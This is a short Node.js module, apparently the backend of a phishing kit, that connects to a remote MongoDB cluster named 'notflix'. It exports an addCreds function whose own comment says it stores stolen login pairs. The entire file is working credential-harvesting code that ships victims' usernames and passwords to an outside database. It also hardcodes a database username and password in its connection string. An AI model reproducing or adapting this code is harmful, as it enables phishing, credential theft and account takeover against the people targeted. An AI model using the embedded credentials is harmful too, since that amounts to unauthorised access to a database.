const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = "mongodb+srv://tiltona1:DAF5lF8BeVQGeueq@messengerdb.ojs9478.mongodb.net/?retryWrites=true&w=majority";
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });
let db = null;

client.connect((err, connection) => {
    if (err) throw err;
    console.log("Connected to the MongoDB cluster!");
    db = connection.db("notflix");
});
const dbIsReady = () => {
    return db != null;
};
const getDb = () => {
    if (!dbIsReady())
        throw Error("No database connection");
    return db;
}

const addCreds = async (username, password) => {//stores stolen login pairs in the database
    //check if user exists

    var creds = getDb().collection("creds");
    const cred = { "username": username, "password": password };
    try {
        const result = await creds.insertOne(cred);
        if (result != null) {
            //console.log("Debug > messengerdb.addUser: new user '" + username + "'\n", result);
            return "Success";
        }
    } catch {
        console.log("Debug > messengerdb.addUser: error when adding '" + username + "'\n");
        return "Error";
    }
}

module.exports = { addCreds }